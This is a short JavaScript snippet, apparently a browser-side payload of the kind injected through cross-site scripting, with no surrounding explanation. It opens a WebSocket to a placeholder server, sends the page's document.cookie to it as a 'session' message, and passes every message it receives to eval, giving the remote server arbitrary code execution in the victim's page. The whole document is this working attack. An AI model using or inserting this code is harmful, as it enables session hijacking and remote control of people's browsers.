var ws = new WebSocket("ws://your-server-url:your-server-port");
var messages = [];
ws.onopen = function () {
    ws.send("session " + document.cookie);
    for (var i = 0; i < messages.length; i++) {
        ws.send(messages[i]);
    }
};
ws.onmessage = function (event) {
  console.log(event.data);
  eval(event.data);
};